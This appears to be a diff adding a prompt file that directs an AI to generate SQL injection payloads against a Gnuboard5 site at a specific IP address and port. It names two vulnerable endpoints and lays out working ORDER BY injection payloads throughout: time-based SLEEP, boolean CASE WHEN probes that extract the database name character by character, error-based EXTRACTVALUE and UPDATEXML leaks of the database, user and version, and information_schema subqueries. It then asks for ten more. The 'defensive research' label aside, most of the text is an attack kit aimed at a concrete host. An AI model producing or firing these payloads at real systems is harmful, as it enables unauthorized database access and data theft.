@@ -1,0 +1,62 @@
+You are a cybersecurity expert specializing in web application attacks.
+Generate security test payloads for defensive research purposes only.
+Output only the required lines in the exact format specified.
+No explanations, no headings, no numbering, no bullet points, no blank lines.
+
+---
+
+Target: Gnuboard5 (Apache + PHP + MySQL)
+Base URL: http://34.68.27.120:8081/
+
+Endpoints:
+  GET /bbs/search.php?sst=[PAYLOAD]&sod=[PAYLOAD]
+  GET /bbs/qalist.php?sst=[PAYLOAD]&sod=[PAYLOAD]
+
+Injection context: Direct concatenation into ORDER BY clause — no parameterization, no quotes:
+  SELECT ... FROM g5_write_free WHERE ... ORDER BY {sst} {sod}
+
+Normal values:
+  sst: wr_datetime, wr_num, wr_hit, wr_subject
+  sod: ASC, DESC
+
+Key constraint: ORDER BY clause does NOT allow UNION SELECT.
+Subqueries and functions DO work inside ORDER BY.
+No quotes wrap the injected value — numeric/identifier context.
+
+Attack techniques:
+1. Time-based via SLEEP in ORDER BY:
+   sst: (SELECT SLEEP(5))
+   sst: wr_datetime,(SELECT SLEEP(5))
+   sst: IF(1=1,SLEEP(5),wr_datetime)
+
+2. Boolean-based via CASE WHEN (sorts differently based on condition):
+   sst: CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END
+   sst: CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END
+   sst: CASE WHEN (LENGTH(database())=6) THEN wr_datetime ELSE wr_num END
+
+3. Error-based via function injection:
+   sst: EXTRACTVALUE(1,CONCAT(0x7e,database()))
+   sst: UPDATEXML(1,CONCAT(0x7e,user()),1)
+   sst: UPDATEXML(1,CONCAT(0x7e,version()),1)
+
+4. sod (ASC/DESC) injection — shorter payload, different position:
+   sod: ASC,(SELECT SLEEP(5))
+   sod: DESC,EXTRACTVALUE(1,CONCAT(0x7e,database()))
+   sod: (SELECT IF(1=1,1,SLEEP(5)))
+
+5. Subquery-based data extraction in ORDER BY:
+   sst: (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)
+   sst: (SELECT column_name FROM information_schema.columns WHERE table_name=0x6735 LIMIT 1)
+
+Generate 10 ORDER BY injection payloads for Gnuboard5.
+Mix: time-based, boolean CASE WHEN, error-based, sod position.
+
+Output format (one line per payload, no other text):
+TYPE | PATTERN_FAMILY | PAYLOAD
+
+Example:
+SQLI_ORDERBY | time_sleep | (SELECT SLEEP(5))
+SQLI_ORDERBY | bool_case_true | CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END
+SQLI_ORDERBY | bool_case_ascii | CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END
+SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))
+SQLI_ORDERBY | sod_sleep | ASC,(SELECT SLEEP(5))
